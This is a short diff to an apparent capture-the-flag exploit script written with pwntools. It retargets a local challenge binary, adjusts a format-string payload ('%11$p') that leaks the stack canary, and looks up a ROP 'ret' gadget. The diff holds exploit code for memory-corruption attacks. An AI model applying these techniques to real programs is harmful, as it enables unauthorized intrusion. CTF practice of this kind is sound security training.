@@ -1,15 +1,15 @@
 from pwn import *
 
-# io = process("./chal")
-io = remote("0.0.0.0",1005)
+io = process("./chal")
+# io = remote("0.0.0.0",1005)
 elf = ELF("./chal")
 r = ROP("./chal")
 
 io.recvline()
 
-io.sendlineafter(": ","%37$p")  #leaking the canary
+io.sendlineafter(": ","%11$p")  #leaking the canary
 io.recvline()
-leak = int(io.recvline().strip(),16)    
+leak = int(io.recvline().strip(),16)   
 
 
 RET = r.find_gadget(["ret"]).address
